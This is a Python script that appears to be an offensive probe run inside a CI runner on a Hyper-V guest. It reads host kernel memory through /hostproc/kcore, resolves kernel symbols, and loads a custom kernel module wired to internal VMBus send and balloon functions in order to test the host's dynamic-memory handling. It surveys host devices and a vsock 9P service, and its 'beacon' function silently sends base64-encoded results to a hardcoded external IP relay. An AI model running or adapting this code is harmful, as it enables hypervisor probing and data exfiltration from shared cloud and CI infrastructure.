#!/usr/bin/env python3
"""Definitive A-only Dynamic Memory policy gate."""

import base64
import ctypes
import glob
import json
import os
import re
import socket
import struct
import time
import urllib.parse
import urllib.request

DM_CLASS = "{525074dc-8985-46e2-8057-a307dc18a502}"
VSMB_CLASS = "{4d12e519-17a0-4ae4-8eaa-5270fc6abdb7}"
VMIC_CLASSES = {
    "shutdown": "{0e0b6031-5213-4934-818b-38d90ced39db}",
    "time_sync": "{9527e630-d0ae-497b-adce-e80ab0175caf}",
    "heartbeat": "{57164f39-9115-4e78-ab55-382f3bd5422d}",
    "data_exchange": "{a9a0f4e7-5a45-4d96-b827-8a841e8c03e6}",
    "backup": "{35fa2e29-ea23-4236-96ae-3a6ebacba440}",
    "guest_services": "{34d14be3-dee4-41c8-9ae7-6b174977c192}",
}
MODULE = "/tmp/hvraw_dm_status.ko"
PROC = "/hostproc"
SYS = "/hostsys"
RELAY = "http://16.146.243.72:8450/MYTH_DM_CONTROL"


class KCore:
    def __init__(self, path):
        self.fd = os.open(path, os.O_RDONLY)
        header = os.pread(self.fd, 64, 0)
        fields = struct.unpack("<16sHHIQQQIHHHHHH", header)
        phoff, phentsize, phnum = fields[5], fields[9], fields[10]
        self.loads = []
        for index in range(phnum):
            raw = os.pread(self.fd, phentsize, phoff + index * phentsize)
            ptype, _, offset, vaddr, _, filesz, _, _ = struct.unpack(
                "<IIQQQQQQ", raw[:56])
            if ptype == 1 and filesz:
                self.loads.append((vaddr, vaddr + filesz, offset))

    def read(self, address, length):
        for start, end, offset in self.loads:
            if start <= address and address + length <= end:
                return os.pread(self.fd, length, offset + address - start)
        raise ValueError("address outside kcore loads")


def symbol_address(name, symbol_types="t"):
    with open(PROC + "/kallsyms") as stream:
        for line in stream:
            fields = line.split()
            if (len(fields) >= 3 and fields[2] == name and
                    fields[1].lower() in symbol_types):
                return int(fields[0], 16)
    raise KeyError(name)


def primary_relid():
    devices = [path for path in glob.glob(SYS + "/bus/vmbus/devices/*")
               if open(path + "/class_id").read().strip().lower() == DM_CLASS]
    if len(devices) != 1:
        raise RuntimeError("dynamic-memory device count=%d" % len(devices))
    channel_dirs = glob.glob(devices[0] + "/channels/*")
    primary = [path for path in channel_dirs
               if open(path + "/subchannel_id").read().strip() == "0"]
    if len(primary) != 1:
        raise RuntimeError("dynamic-memory primary channels=%r" % primary)
    return int(os.path.basename(primary[0])), os.path.basename(devices[0])


def channel_for_relid(kcore, relid):
    address = symbol_address("relid2channel")
    code = kcore.read(address, 160)
    candidates = []
    for index in range(len(code) - 7):
        if not (code[index] in (0x48, 0x4c) and code[index + 1] == 0x8b
                and code[index + 2] & 0xc7 == 0x05):
            continue
        displacement = struct.unpack("<i", code[index + 3:index + 7])[0]
        global_address = address + index + 7 + displacement
        try:
            array_address = struct.unpack("<Q", kcore.read(global_address, 8))[0]
            candidate = struct.unpack(
                "<Q", kcore.read(array_address + relid * 8, 8))[0]
        except (OSError, ValueError, struct.error):
            continue
        if array_address >> 48 == 0xffff and candidate >> 48 == 0xffff:
            candidates.append(candidate)
    if len(set(candidates)) != 1:
        raise RuntimeError("channel candidates=%r" % [hex(x) for x in candidates])
    return candidates[0]


def load_module(channel, send, balloon_up):
    libc = ctypes.CDLL(None, use_errno=True)
    fd = os.open(MODULE, os.O_RDONLY)
    parameters = ("channel=%#x send_fn=%#x balloon_up_fn=%#x reports=5" %
                  (channel, send, balloon_up)).encode()
    try:
        result = libc.syscall(313, fd, parameters, 3)
        error = ctypes.get_errno() if result else 0
    finally:
        os.close(fd)
    if result and error != 17:
        raise OSError(error, "finit_module")


def trace_root():
    for root in (SYS + "/kernel/tracing", SYS + "/kernel/debug/tracing"):
        if os.path.exists(root + "/events/hyperv/balloon_status/enable"):
            return root
    # The UVM init mount namespace normally leaves tracefs unmounted. The
    # usermode-helper root used by this workflow has CAP_SYS_ADMIN; mount the
    # per-UVM tracefs only when needed and let allocation teardown remove it.
    candidate = SYS + "/kernel/tracing"
    os.makedirs(candidate, exist_ok=True)
    libc = ctypes.CDLL(None, use_errno=True)
    ctypes.set_errno(0)
    mounted = libc.mount(b"tracefs", candidate.encode(), b"tracefs", 0, b"")
    mount_error = ctypes.get_errno() if mounted else 0
    if mounted and mount_error != 16:
        raise OSError(mount_error, "mount tracefs")
    if os.path.exists(candidate + "/events/hyperv/balloon_status/enable"):
        return candidate
    raise RuntimeError("balloon_status tracepoint absent")


def read_trace(root):
    text = open(root + "/trace", errors="replace").read()
    pattern = (r"balloon_status: available (?P<available>\d+), committed "
               r"(?P<committed>\d+);.*pages_ballooned (?P<ballooned>\d+),")
    values = [{key: int(value) for key, value in match.groupdict().items()}
              for match in re.finditer(pattern, text)]
    return values


def read_param(name):
    return int(open(SYS + "/module/hvraw_dm_status/parameters/" + name).read())


def public_census():
    devices = []
    for path in sorted(glob.glob(SYS + "/bus/vmbus/devices/*")):
        relids = sorted(int(os.path.basename(channel)) for channel in
                        glob.glob(path + "/channels/*"))
        driver_path = os.path.realpath(path + "/driver")
        devices.append({
            "class_id": open(path + "/class_id").read().strip().lower(),
            "device_id": open(path + "/device_id").read().strip().lower(),
            "driver": (os.path.basename(driver_path) if
                       os.path.exists(path + "/driver") else "unbound"),
            "relids": relids,
        })

    filesystems = {}
    for label, mountinfo in (("init", PROC + "/1/mountinfo"),
                             ("root_helper", PROC + "/self/mountinfo")):
        kinds = set()
        with open(mountinfo) as stream:
            for line in stream:
                tail = line.partition(" - ")[2].split()
                if tail:
                    kinds.add(tail[0])
        filesystems[label] = sorted(kinds)
    advertised = {device["class_id"] for device in devices}
    return {
        "devices": devices,
        "filesystem_types": filesystems,
        "vsmb_vmusrv": VSMB_CLASS in advertised,
        "vmic_services": sorted(name for name, guid in VMIC_CLASSES.items()
                                if guid in advertised),
    }


def recv_exact(stream, length):
    chunks = []
    while length:
        chunk = stream.recv(length)
        if not chunk:
            raise EOFError("short response")
        chunks.append(chunk)
        length -= len(chunk)
    return b"".join(chunks)


def plan9_version_census():
    """Test only the standard LCOW host-side 9P version handshake."""
    if not hasattr(socket, "AF_VSOCK"):
        return {"status": "af_vsock_unavailable"}

    version = b"9P2000.L"
    request_size = 4 + 1 + 2 + 4 + 2 + len(version)
    request = (struct.pack("<IBHIH", request_size, 100, 0xffff, 8192,
                           len(version)) + version)
    try:
        with socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM) as stream:
            stream.settimeout(2)
            try:
                stream.connect((2, 564))
            except OSError as error:
                return {"status": "connect_error", "errno": error.errno}
            stream.sendall(request)
            size = struct.unpack("<I", recv_exact(stream, 4))[0]
            if size < 7 or size > 8192:
                return {"status": "invalid_size", "size": size}
            response = recv_exact(stream, size - 4)
            message_type, tag = struct.unpack("<BH", response[:3])
            result = {"message_type": message_type, "size": size,
                      "tag": tag}
            if message_type != 101 or len(response) < 9:
                return {**result, "status": "unexpected_response"}
            msize, version_length = struct.unpack("<IH", response[3:9])
            if len(response) != 9 + version_length:
                return {**result, "status": "invalid_version_length",
                        "msize": msize,
                        "version_length": version_length}
            return {**result, "status": "rversion", "msize": msize,
                    "version": response[9:].decode("ascii", "replace")}
    except (OSError, EOFError, struct.error) as error:
        return {"status": "io_error", "errno": getattr(error, "errno", None),
                "error": type(error).__name__}


def beacon(result):
    try:
        encoded = base64.urlsafe_b64encode(
            json.dumps(result, sort_keys=True).encode()).decode()
        urllib.request.urlopen(RELAY + "?d=" + urllib.parse.quote(encoded),
                               timeout=3).read()
    except Exception:
        pass


def main():
    try:
        run_id = open("/tmp/b_run_id").read().strip()
    except OSError:
        run_id = os.environ.get("GITHUB_RUN_ID", "")
    result = {"status": "init", "run_id": run_id}
    root = None
    event_was_enabled = None
    pressure_path = SYS + "/module/hv_balloon/parameters/pressure_report_delay"
    pressure_was = None
    try:
        result.update(kernel=os.uname().release, census=public_census(),
                      plan9=plan9_version_census())
        beacon({**result, "status": "public_census"})
        relid, device = primary_relid()
        kcore = KCore(PROC + "/kcore")
        channel = channel_for_relid(kcore, relid)
        send = symbol_address("vmbus_sendpacket")
        balloon_up = symbol_address("balloon_up")
        result.update(relid=relid, device=device)
        if os.path.exists(pressure_path):
            pressure_was = open(pressure_path).read().strip()
            open(pressure_path, "w").write("0\n")

        root = trace_root()
        event_path = root + "/events/hyperv/balloon_status/enable"
        event_was_enabled = open(event_path).read().strip()
        open(event_path, "w").write("1\n")
        time.sleep(2.2)
        baseline_values = read_trace(root)
        if not baseline_values:
            raise RuntimeError("no stock balloon_status sample")
        baseline = baseline_values[-1]
        result["baseline"] = baseline
        beacon({**result, "status": "baseline"})
        if baseline["ballooned"] != 0:
            result.update(status="ambiguous_existing_balloon_state")
            return

        load_module(channel, send, balloon_up)
        deadline = time.monotonic() + 15
        peak = baseline["ballooned"]
        while time.monotonic() < deadline and read_param("mutated") < 5:
            time.sleep(0.25)
            peak = max(peak, read_trace(root)[-1]["ballooned"])

        # Give the host a few balancing ticks after the fifth unmodified-ID,
        # genuine-cadence report. The receiver probe only observes balloon_up.
        time.sleep(4)
        mutations = read_param("mutated")
        receiver = read_param("receiver_requests")
        final = read_trace(root)[-1]
        peak = max(peak, final["ballooned"])
        result.update(mutations=mutations, receiver_type6=receiver,
                      peak_ballooned=peak, final=final)
        if mutations != 5:
            result.update(status="incomplete_stock_status_gate")
        elif receiver:
            result.update(status="receiver_type6")
        else:
            result.update(status="fixed_or_no_balloon_policy")
    except Exception as error:
        result.update(status="error", error="%s:%s" %
                      (type(error).__name__, error))
    finally:
        if root and event_was_enabled == "0":
            try:
                open(root + "/events/hyperv/balloon_status/enable", "w").write("0\n")
            except OSError:
                pass
        if pressure_was is not None:
            try:
                open(pressure_path, "w").write(pressure_was + "\n")
            except OSError:
                pass
        open("/tmp/dm-control-result.json", "w").write(
            json.dumps(result, sort_keys=True) + "\n")
        beacon(result)


if __name__ == "__main__":
    main()
